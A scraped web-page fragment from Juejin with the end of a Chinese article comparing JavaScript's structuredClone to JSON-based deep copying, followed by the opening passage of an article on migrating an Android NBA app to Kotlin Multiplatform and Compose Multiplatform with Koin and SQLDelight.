ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">深拷贝的老办法</h2>
<p>在 JavaScript 中深拷贝一个对象，最常见的"hack"写法是：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> copy = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(original));
</code></pre>
<p>这个方法简单粗暴，但有一堆坑：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> obj = {
  <span class="hljs-attr">date</span>: <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>(),
  <span class="hljs-attr">regex</span>: <span class="hljs-regexp">/test/gi</span>,
  <span class="hljs-attr">map</span>: <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>([[<span class="hljs-string">"key"</span>, <span class="hljs-string">"value"</span>]]),
  <span class="hljs-attr">set</span>: <span class="hljs-keyword">new</span> <span class="hljs-title class_">Set</span>([<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>]),
  <span class="hljs-attr">undef</span>: <span class="hljs-literal">undefined</span>,
  <span class="hljs-attr">fn</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-string">"hello"</span>,
  <span class="hljs-attr">nan</span>: <span class="hljs-title class_">NaN</span>,
  <span class="hljs-attr">infinity</span>: <span class="hljs-title class_">Infinity</span>,
};

<span class="hljs-keyword">const</span> copy = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(obj));
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(copy);
<span class="hljs-comment">// {</span>
<span class="hljs-comment">//   date: "2026-02-11T06:00:00.000Z",  ← 变成了字符串</span>
<span class="hljs-comment">//   regex: {},                           ← 丢失了</span>
<span class="hljs-comment">//   map: {},                             ← 丢失了</span>
<span class="hljs-comment">//   set: {},                             ← 丢失了</span>
<span class="hljs-comment">//                                        ← undefined 直接消失</span>
<span class="hljs-comment">//                                        ← 函数直接消失</span>
<span class="hljs-comment">//   nan: null,                           ← 变成了 null</span>
<span class="hljs-comment">//   infinity: null                       ← 变成了 null</span>
<span class="hljs-comment">// }</span>
</code></pre>
<p>还有一个致命问题 —— 循环引用直接报错：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> a = { <span class="hljs-attr">name</span>: <span class="hljs-string">"a"</span> };
a.<span class="hljs-property">self</span> = a;
<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(a)); <span class="hljs-comment">// ❌ TypeError: Converting circular structure to JSON</span>
</code></pre>
<h2 data-id="heading-1">structuredClone 登场</h2>
<p><code>structuredClone()</code> 是浏览器和 Node.js (v17+) 提供的<strong>原生深拷贝</strong>方法：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> original = {
  <span class="hljs-attr">date</span>: <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>(),
  <span class="hljs-attr">regex</span>: <span class="hljs-regexp">/test/gi</span>,
  <span class="hljs-attr">map</span>: <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>([[<span class="hljs-string">"key"</span>, <span class="hljs-string">"value"</span>]]),
  <span class="hljs-attr">set</span>: <span class="hljs-keyword">new</span> <span class="hljs-title class_">Set</span>([<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>]),
  <span class="hljs-attr">nested</span>: { <span class="hljs-attr">deep</span>: { <span class="hljs-attr">value</span>: <span class="hljs-number">42</span> } },
  <span class="hljs-attr">arr</span>: [<span class="hljs-number">1</span>, [<span class="hljs-number">2</span>, [<span class="hljs-number">3</span>]]],
};

<span class="hljs-keyword">const</span> copy = <span class="hljs-title function_">structuredClone</span>(original);

copy.<span class="hljs-property">nested</span>.<span class="hljs-property">deep</span>.<span class="hljs-property">value</span> = <span class="hljs-number">0</span>;
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(original.<span class="hljs-property">nested</span>.<span class="hljs-property">deep</span>.<span class="hljs-property">value</span>); <span class="hljs-comment">// 42 ✅ 互不影响</span>

copy.<span class="hljs-property">date</span> <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Date</span>; <span class="hljs-comment">// true ✅ 类型保留</span>
copy.<span class="hljs-property">regex</span> <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">RegExp</span>; <span class="hljs-comment">// true ✅</span>
copy.<span class="hljs-property">map</span> <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Map</span>; <span class="hljs-comment">// true ✅</span>
copy.<span class="hljs-property">set</span> <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Set</span>; <span class="hljs-comment">// true ✅</span>
</code></pre>
<p>循环引用也能正确处理：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> a = { <span class="hljs-attr">name</span>: <span class="hljs-string">"a"</span> };
a.<span class="hljs-property">self</span> = a;
<span class="hljs-keyword">const</span> b = <span class="hljs-title function_">structuredClone</span>(a); <span class="hljs-comment">// ✅ 正常工作</span>
b.<span class="hljs-property">self</span> === b; <span class="hljs-comment">// true（引用指向拷贝后的自身）</span>
</code></pre>
<h2 data-id="heading-2">支持的类型</h2>
<p>structuredClone 使用的是结构化克隆算法，支持绝大多数内置类型：</p>













































<table><thead><tr><th>类型</th><th>JSON 方式</th><th>structuredClone</th></tr></thead><tbody><tr><td>Date</td><td>❌ 变字符串</td><td>✅</td></tr><tr><td>RegExp</td><td>❌ 变 <code>{}</code></td><td>✅</td></tr><tr><td>Map / Set</td><td>❌ 变 <code>{}</code></td><td>✅</td></tr><tr><td>ArrayBuffer</td><td>❌</td><td>✅</td></tr><tr><td>undefined</td><td>❌ 丢失</td><td>✅</td></tr><tr><td>NaN / Infinity</td><td>❌ 变 null</td><td>✅</td></tr><tr><td>循环引用</td><td>❌ 报错</td><td>✅</td></tr></tbody></table>
<h2 data-id="heading-3">不支持什么</h2>
<p>有几种东西是 structuredClone <strong>无法克隆</strong>的：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// ❌ 函数</span>
<span class="hljs-title function_">structuredClone</span>({ <span class="hljs-attr">fn</span>: <span class="hljs-function">() =&gt;</span> {} });
<span class="hljs-comment">// DOMException: () =&gt; {} could not be cloned.</span>

<span class="hljs-comment">// ❌ DOM 节点</span>
<span class="hljs-title function_">structuredClone</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>);

<span class="hljs-comment">// ❌ 原型链（拷贝后丢失）</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Dog</span> {
  <span class="hljs-title function_">bark</span>(<span class="hljs-params"/>) { <span class="hljs-keyword">return</span> <span class="hljs-string">"woof"</span>; }
}
<span class="hljs-keyword">const</span> dog = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Dog</span>();
<span class="hljs-keyword">const</span> cloned = <span class="hljs-title function_">structuredClone</span>(dog);
cloned <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Dog</span>; <span class="hljs-comment">// false</span>
cloned.<span class="hljs-property">bark</span>; <span class="hljs-comment">// undefined</span>
</code></pre>
<p>所以如果你的对象包含函数或需要保留原型链，structuredClone 不适用。</p>
<h2 data-id="heading-4">一个实用技巧：transferable objects</h2>
<p>structuredClone 支持第二个参数 <code>transfer</code>，可以"移交"而不是"复制"某些对象（如 ArrayBuffer），避免内存翻倍：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> buffer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayBuffer</span>(<span class="hljs-number">1024</span> * <span class="hljs-number">1024</span>); <span class="hljs-comment">// 1MB</span>
<span class="hljs-keyword">const</span> copy = <span class="hljs-title function_">structuredClone</span>(buffer, { <span class="hljs-attr">transfer</span>: [buffer] });

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(buffer.<span class="hljs-property">byteLength</span>); <span class="hljs-comment">// 0 ← 原始的被清空了</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(copy.<span class="hljs-property">byteLength</span>); <span class="hljs-comment">// 1048576 ← 数据转移到了 copy</span>
</code></pre>
<p>这在处理大型二进制数据时非常有用。</p>
<h2 data-id="heading-5">兼容性</h2>
<ul>
<li>Chrome 98+, Firefox 94+, Safari 15.4+, Node.js 17+</li>
<li>2026 年的今天，基本可以放心使用</li>
</ul>
<h2 data-id="heading-6">总结</h2>





















<table><thead><tr><th>场景</th><th>推荐方案</th></tr></thead><tbody><tr><td>简单对象，无特殊类型</td><td><code>JSON.parse(JSON.stringify())</code> 仍然可用</td></tr><tr><td>包含 Date/Map/Set/循环引用</td><td><code>structuredClone()</code></td></tr><tr><td>需要保留原型链/函数</td><td>手写递归或 lodash <code>_.cloneDeep()</code></td></tr></tbody></table>
<p>以后深拷贝，先想想 <code>structuredClone</code> 吧。</p>
<hr/>
<blockquote>
<p>原文链接：<a href="https://link.juejin.cn?target=https%3A%2F%2Fchenguangliang.com%2Fposts%2Fjs-structured-clone%2F" target="_blank" title="https://chenguangliang.com/posts/js-structured-clone/" ref="nofollow noopener noreferrer">chenguangliang.com/posts/js-st…</a></p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[实战：将 Android 多Module应用迁移到 kmp+cmp]]></title>    <link>https://juejin.cn/post/7605907495769767945</link>    <guid>https://juejin.cn/post/7605907495769767945</guid>    <pubDate>2026-02-13T05:24:28.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7605907495769767945" data-draft-id="7605811866908835849" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="实战：将 Android 多Module应用迁移到 kmp+cmp"/> <meta itemprop="keywords" content="Kotlin,Android,iOS"/> <meta itemprop="datePublished" content="2026-02-13T05:24:28.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="智先森zhi"/> <meta itemprop="url" content="https://juejin.cn/user/1987506650767966"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            实战：将 Android 多Module应用迁移到 kmp+cmp
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1987506650767966/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    智先森zhi
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-13T05:24:28.000Z" title="Fri Feb 13 2026 05:24:28 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-13
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    3
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读7分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">实战：将 Android 多模块应用迁移到 Kotlin Multiplatform + Compose Multiplatform</h2>
<p>最近把自己的 NBA 数据应用 <a href="https://juejin.cn/post/7605451617286553627" target="_blank" title="https://juejin.cn/post/7605451617286553627">HoopsNow</a> 从纯 Android 多模块架构迁移到了 KMP + CMP，实现了 Android/iOS 共享一套代码。这篇文章记录整个迁移过程中的思路、踩坑和最终方案。</p>

<h3 data-id="heading-1">项目背景</h3>
<p>HoopsNow 是一个 NBA 数据展示应用，功能包括比赛比分、球队信息、球员搜索和收藏管理。迁移前的架构参考了 Google 的 <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fandroid%2Fnowinandroid" target="_blank" title="https://github.com/android/nowinandroid" ref="nofollow noopener noreferrer">Now in Android</a> 项目，是一个标准的 Android 多模块架构：</p>
<pre><code class="hljs language-bash" lang="bash">hoopsnow/
├── app/                        <span class="hljs-comment"># 入口 + Navigation3</span>
├── core/                       <span class="hljs-comment"># 9 个核心模块</span>
│   ├── common/                 <span class="hljs-comment"># 工具类</span>
│   ├── data/                   <span class="hljs-comment"># Repository</span>
│   ├── database/               <span class="hljs-comment"># Room</span>
│   ├── datastore/              <span class="hljs-comment"># DataStore</span>
│   ├── designsystem/           <span class="hljs-comment"># 主题</span>
│   ├── model/                  <span class="hljs-comment"># 数据模型</span>
│   ├── network/                <span class="hljs-comment"># Ktor</span>
│   ├── testing/                <span class="hljs-comment"># 测试工具</span>
│   └── ui/                     <span class="hljs-comment"># 共享 UI</span>
├── feature/                    <span class="hljs-comment"># 4 个功能模块 (api/impl)</span>
│   ├── games/
│   ├── teams/
│   ├── players/
│   └── favorites/
└── build-logic/                <span class="hljs-comment"># 7 个 Convention Plugins</span>
</code></pre>
<p>技术栈：<strong>Hilt</strong> + <strong>Navigation3</strong> + <strong>Room</strong> + <strong>ViewModel</strong> + <strong>Coil</strong></p>
<p>这套架构在纯 Android 场景下很好用，模块边界清晰，构建并行度高。但当我想把应用扩展到 iOS 时，这些 Android 专属的库就成了障碍。</p>
<h3 data-id="heading-2">为什么选择 KMP + CMP</h3>
<p>考虑过几个方案：</p>






























<table><thead><tr><th>方案</th><th>优点</th><th>缺点</th></tr></thead><tbody><tr><td>Flutter</td><td>生态成熟，热重载</td><td>需要重写全部代码，Dart 语言</td></tr><tr><td>React Native</td><td>Web 开发者友好</td><td>性能开销，桥接复杂</td></tr><tr><td>KMP + 原生 UI</td><td>共享逻辑，原生体验</td><td>需要写两套 UI</td></tr><tr><td>KMP + CMP</td><td>共享逻辑 + UI，Kotlin 全栈</td><td>CMP iOS 端相对年轻</td></tr></tbody></table>
<p>最终选了 KMP + CMP，原因很简单：现有代码是 Kotlin + Compose，迁移成本最低，UI 也能共享。</p>
<h3 data-id="heading-3">技术栈替换</h3>
<p>迁移的核心就是把 Android 专属库替换为 KMP 兼容的���：</p>





















































<table><thead><tr><th>功能</th><th>迁移前</th><th>迁移后</th><th>迁移难度</th></tr></thead><tbody><tr><td>依赖注入</td><td>Hilt</td><td><strong>Koin 4.0</strong></td><td>⭐⭐</td></tr><tr><td>导航</td><td>Navigation3</td><td><strong>Voyager 1.1.0-beta03</strong></td><td>⭐⭐⭐</td></tr><tr><td>数据库</td><td>Room</td><td><strong>SQLDelight 2.0</strong></td><td>⭐⭐⭐</td></tr><tr><td>状态管理</td><td>ViewModel</td><td><strong>Voyager ScreenModel</strong></td><td>⭐</td></tr><tr><td>图片加载</td><td>Coil</td><td><strong>Coil 3 (KMP)</strong></td><td>⭐</td></tr><tr><td>网络</td><td>Ktor (Android)</td><td><strong>Ktor 3.0 (KMP)</strong></td><td>⭐</td></tr><tr><td>UI</td><td>Jetpack Compose</td><td><strong>Compose Multiplatform 1.7</strong></td><td>⭐</td></tr></tbody></table>
<p>下面逐个说说迁移细节。</p>
<h3 data-id="heading-4">一、创建 shared 模块</h3>
<p>第一步是创建 KMP 共享模块。<code>shared/build.gradle.kts</code> 的核心配置：</p>
<pre><code class="hljs language-kotlin" lang="kotlin">plugins {
    alias(libs.plugins.kotlin.multiplatform)
    alias(libs.plugins.android.library)
    alias(libs.plugins.kotlin.compose)
    alias(libs.plugins.compose.multiplatform)
    alias(libs.plugins.kotlin.serialization)
    alias(libs.plugins.sqldelight)
}

kotlin {
    androidTarget {
        compilerOptions { jvmTarget.<span class="hljs-keyword">set</span>(JvmTarget.JVM_17) }
    }

    listOf(iosX64(), iosArm64(), iosSimulatorArm64()).forEach {
        it.binaries.framework {
            baseName = <span class="hljs-string">"Shared"</span>
            isStatic = <span class="hljs-literal">true</span>
        }
    }

    sourceSets {
        commonMain.dependencies {
            implementation(compose.runtime)
            implementation(compose.foundation)
            implementation(compose.material3)
            implementation(compose.materialIconsExtended)
            <span class="hljs-comment">// Ktor, SQLDelight, Koin, Voyager, Coil ...</span>
        }
        androidMain.dependencies {
            implementation(libs.ktor.client.okhttp)
            implementation(libs.sqldelight.android.driver)
        }
        iosMain.dependencies {
            implementation(libs.ktor.client.darwin)
            implementation(libs.sqldelight.native.driver)
        }
    }
}
</code></pre>
<h3 data-id="heading-5">二、数据库迁移：Room → SQLDelight</h3>
<p>这是迁移中工作量最大的部分。Room 不支持 KMP，必须换成 SQLDelight。</p>
<h4 data-id="heading-6">定义 .sq 文件</h4>
<p>SQLDelight 用 <code>.sq</code> 文件定义表结构和查询，放在 <code>commonMain/sqldelight/</code> 目录下：</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- Team.sq</span>
<span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> TeamEntity (
    id <span class="hljs-type">INTEGER</span> <span class="hljs-keyword">PRIMARY</span> KEY <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span>,
    conference TEXT <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span>,
    division TEXT <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span>,
    city TEXT <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span>,
    name TEXT <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span>,
    fullName TEXT <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span>,
    abbreviation TEXT <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span>
);

getAll: <span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> TeamEntity;
getById: <span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> TeamEntity <span class="hljs-keyword">WHERE</span> id <span class="hljs-operator">=</span> ?;
upsert: <span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">OR</span> REPLACE <span class="hljs-keyword">INTO</span> TeamEntity <span class="hljs-keyword">VALUES</span> (?, ?, ?, ?, ?, ?, ?);
</code></pre>
<h4 data-id="heading-7">平台 Driver</h4>
<p>通过 <code>expect/actual</code> 为不同平台提供数据库驱动：</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// commonMain</span>
<span class="hljs-keyword">expect</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DatabaseDriverFactory</span> {
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">createDriver</span><span class="hljs-params">()</span></span>: SqlDriver
}

<span class="hljs-comment">// androidMain</span>
<span class="hljs-keyword">actual</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DatabaseDriverFactory</span>(<span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> context: Context) {
    <span class="hljs-keyword">actual</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">createDriver</span><span class="hljs-params">()</span></span>: SqlDriver =
        AndroidSqliteDriver(NbaDatabase.Schema, context, <span class="hljs-string">"nba.db"</span>)
}

<span class="hljs-comment">// iosMain</span>
<span class="hljs-keyword">actual</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DatabaseDriverFactory</span> {
    <span class="hljs-keyword">actual</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">createDriver</span><span class="hljs-params">()</span></span>: SqlDriver =
        NativeSqliteDriver(NbaDatabase.Schema, <span class="hljs-string">"nba.db"</span>)
}
</code></pre>
<h4 data-id="heading-8">踩坑：SQLDelight 属性名</h4>
<p>SQLDelight 生成的 Queries 属性名基于 <code>.sq</code> 文件名，不是表名。比如 <code>Game.sq</code> 生成 <code>database.gameQueries</code>，不是 <code>database.gameEntityQueries</code>。这个坑让我排查了好一会儿。</p>
<h4 data-id="heading-9">踩坑：Kotlin 类型推断</h4>
<p>SQLDelight 的链式 mapper 调用会让 Kotlin 的类型推断犯迷糊。解决方案是写显式的扩展函数：</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-function"><span class="hljs-keyword">fun</span> TeamEntity.<span class="hljs-title">toTeam</span><span class="hljs-params">()</span></span>: Team = Team(
    id = id.toInt(),
    conference = conference,
    division = division,
    city = city,
    name = name,
    fullName = fullName,
    abbreviation = abbreviation,
)
</code></pre>
<h3 data-id="heading-10">三、依赖注入：Hilt → Koin</h3>
<p>Hilt 依赖 Android 的注解处理器（KSP），不支持 KMP。Koin 是纯 Kotlin 实现，天然跨平台。</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// commonMain - KoinModules.kt</span>
<span class="hljs-keyword">val</span> sharedModule = module {
    <span class="hljs-comment">// Network</span>
    single&lt;NbaNetworkDataSource&gt; { KtorNbaNetwork(<span class="hljs-keyword">get</span>()) }

    <span class="hljs-comment">// Database</span>
    single { <span class="hljs-keyword">get</span>&lt;DatabaseDriverFactory&gt;().createDriver() }
    single { NbaDatabase(<span class="hljs-keyword">get</span>()) }

    <span class="hljs-comment">// Repositories</span>
    single&lt;GamesRepository&gt; { OfflineFirstGamesRepository(<span class="hljs-keyword">get</span>(), <span class="hljs-keyword">get</span>()) }
    single&lt;TeamsRepository&gt; { OfflineFirstTeamsRepository(<span class="hljs-keyword">get</span>(), <span class="hljs-keyword">get</span>()) }
    single&lt;PlayersRepository&gt; { OfflineFirstPlayersRepository(<span class="hljs-keyword">get</span>(), <span class="hljs-keyword">get</span>()) }
    single&lt;FavoritesRepository&gt; { OfflineFirstFavoritesRepository(<span class="hljs-keyword">get</span>(), <span class="hljs-keyword">get</span>()) }

    <span class="hljs-comment">// ScreenModels</span>
    factory { GamesListScreenModel(<span class="hljs-keyword">get</span>()) }
    factory { params -&gt; GameDetailScreenModel(params.<span class="hljs-keyword">get</span>(), <span class="hljs-keyword">get</span>()) }
    <span class="hljs-comment">// ...</span>
}

<span class="hljs-comment">// 平台模块通过 expect/actual 提供</span>
<span class="hljs-keyword">expect</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">platformModule</span><span class="hljs-params">()</span></span>: Module
</code></pre>
<p>平台模块只需要提供 HTTP 引擎和数据库驱动：</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// androidMain</span>
<span class="hljs-keyword">actual</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">platformModule</span><span class="hljs-params">()</span></span>: Module = module {
    single&lt;HttpClientEngine&gt; { OkHttp.create() }
    single { DatabaseDriverFactory(<span class="hljs-keyword">get</span>()) }
}

<span class="hljs-comment">// iosMain</span>
<span class="hljs-keyword">actual</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">platformModule</span><span class="hljs-params">()</span></span>: Module = module {
    single&lt;HttpClientEngine&gt; { Darwin.create() }
    single { DatabaseDriverFactory() }
}
</code></pre>
